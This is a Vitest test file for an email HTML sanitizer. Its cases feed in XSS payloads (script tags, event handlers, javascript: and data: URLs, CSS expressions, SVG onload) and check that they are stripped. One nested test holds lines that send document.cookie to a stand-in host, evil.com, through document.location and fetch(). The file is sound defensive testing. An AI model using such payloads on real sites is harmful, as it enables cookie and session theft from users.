import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "@/lib/email/sanitize-html";

describe("sanitizeEmailHtml", () => {
  it("returns null for empty input", () => {
    expect(sanitizeEmailHtml(null)).toBeNull();
    expect(sanitizeEmailHtml(undefined)).toBeNull();
    expect(sanitizeEmailHtml("")).toBeNull();
  });

  it("passes through safe plain text", () => {
    const result = sanitizeEmailHtml("Hello world");
    expect(result).toContain("Hello world");
    expect(result).toContain('class="email-content"');
  });

  it("passes through safe HTML formatting", () => {
    const input = "<p>Hello <strong>world</strong></p>";
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("<p>");
    expect(result).toContain("<strong>world</strong>");
  });

  it("strips <script> tags", () => {
    const input = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("alert");
    expect(result).not.toContain("XSS");
  });

  it("strips event handler attributes", () => {
    const tests = [
      '<img src="x" onerror="alert(1)">',
      '<div onload="alert(1)">content</div>',
      '<a href="#" onclick="alert(1)">click</a>',
      '<body onresize="alert(1)">',
      '<img src="valid.png" onmouseover="steal()">',
    ];

    for (const input of tests) {
      const result = sanitizeEmailHtml(input);
      // Result may be null if all content is stripped
      if (result) {
        expect(result).not.toMatch(/on\w+\s*=/i);
      }
    }
  });

  it("blocks javascript: URLs in href", () => {
    const input = '<a href="javascript:alert(1)">click me</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("alert");
  });

  it("blocks javascript: URLs in src", () => {
    const input = '<img src="javascript:alert(1)">';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("javascript:");
  });

  it("blocks data: URLs", () => {
    const input = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("data:text/html");
  });

  it("allows safe href URLs", () => {
    const input = '<a href="https://example.com">link</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain('href="https://example.com"');
  });

  it("allows mailto: URLs", () => {
    const input = '<a href="mailto:test@example.com">email</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("mailto:test@example.com");
  });

  it("sets target=_blank and rel=noopener on links", () => {
    const input = '<a href="https://example.com">link</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain('target="_blank"');
    expect(result).toContain("noopener");
    expect(result).toContain("noreferrer");
  });

  it("strips <style> tags", () => {
    const input = "<style>body{background:red}</style><p>content</p>";
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("<style>");
  });

  it("strips dangerous CSS properties from inline styles", () => {
    const tests = [
      '<div style="background: expression(alert(1))">content</div>',
      '<div style="behavior: url(malicious.htc)">content</div>',
      '<div style="-moz-binding: url(malicious.xml)">content</div>',
      '<div style="background: url(javascript:alert(1))">content</div>',
    ];

    for (const input of tests) {
      const result = sanitizeEmailHtml(input);
      expect(result).not.toMatch(/expression\s*\(/i);
      expect(result).not.toMatch(/url\s*\(/i);
      expect(result).not.toMatch(/behavior\s*:/i);
      expect(result).not.toMatch(/-moz-binding\s*:/i);
    }
  });

  it("allows safe inline styles", () => {
    const input = '<span style="color: red; font-size: 14px; font-weight: bold">text</span>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("color");
    expect(result).toContain("font-size");
    // color value is preserved (CSS override happens at render time via globals.css)
    expect(result).toContain("red");
  });

  it("strips <iframe> tags", () => {
    const input = '<iframe src="https://evil.com"></iframe><p>content</p>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("<iframe>");
  });

  it("strips <object> and <embed> tags", () => {
    const input = '<object data="malicious.swf"></object><embed src="malicious.swf">';
    const result = sanitizeEmailHtml(input);
    // All content stripped → null, or content without forbidden tags
    if (result) {
      expect(result).not.toContain("<object>");
      expect(result).not.toContain("<embed>");
    }
  });

  it("strips <link> tags that could load external CSS/JS", () => {
    const input = '<link rel="stylesheet" href="https://evil.com/steal.css"><p>content</p>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("<link>");
  });

  it("allows safe email table structures", () => {
    const input = "<table><tr><td><p>Cell content</p></td></tr></table>";
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("<table>");
    expect(result).toContain("<tr>");
    expect(result).toContain("<td>");
  });

  it("allows safe images with alt text", () => {
    const input = '<img src="https://example.com/logo.png" alt="Logo" width="100">';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("<img");
    expect(result).toContain("logo.png");
    expect(result).toContain('alt="Logo"');
  });

  it("strips vbscript: URLs", () => {
    const input = '<a href="vbscript:MsgBox(1)">click</a>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("vbscript:");
  });

  it("handles complex nested XSS attempts", () => {
    const input = `
      <div>
        <script>document.location='https://evil.com/?c='+document.cookie</script>
        <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
        <a href="javascript:void(0)" onclick="alert('XSS')">Click</a>
        <style>@import 'https://evil.com/evil.css';</style>
      </div>
    `;
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("script");
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("onclick");
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("document.cookie");
    expect(result).not.toContain("evil.com");
  });

  it("handles SVG-based XSS", () => {
    const input = '<svg onload="alert(1)"><script>alert(2)</script></svg>';
    const result = sanitizeEmailHtml(input);
    expect(result).not.toContain("onload");
    expect(result).not.toContain("alert");
  });

  it("preserves email list structures", () => {
    const input = "<ul><li>Item 1</li><li>Item 2</li></ul>";
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("<ul>");
    expect(result).toContain("<li>Item 1</li>");
  });

  it("preserves blockquotes", () => {
    const input = "<blockquote><p>Quoted text</p></blockquote>";
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("<blockquote>");
    expect(result).toContain("Quoted text");
  });

  it("wraps output in .email-content div for theme-aware CSS", () => {
    const input = "<p>Hello</p>";
    const result = sanitizeEmailHtml(input);
    expect(result).toMatch(/^<div class="email-content">/);
    expect(result).toMatch(/<\/div>$/);
  });

  it("preserves inline styles (CSS override happens at render time)", () => {
    // The sanitizer keeps inline styles; globals.css .email-content rules
    // override them with !important at render time for readability.
    const input = '<span style="color: #000000; background-color: #ffffff">text</span>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("color");
    expect(result).toContain("background-color");
  });

  it("handles emails with hardcoded dark-on-dark or light-on-light colors", () => {
    // These emails have colors that clash with the app theme.
    // The sanitizer preserves them; globals.css overrides at render time.
    const input = '<div style="color: #000; background: #000"><p>Invisible text</p></div>';
    const result = sanitizeEmailHtml(input);
    expect(result).toContain("email-content");
    // Inline styles are preserved — CSS in globals.css handles readability
    expect(result).toContain("color");
  });
});
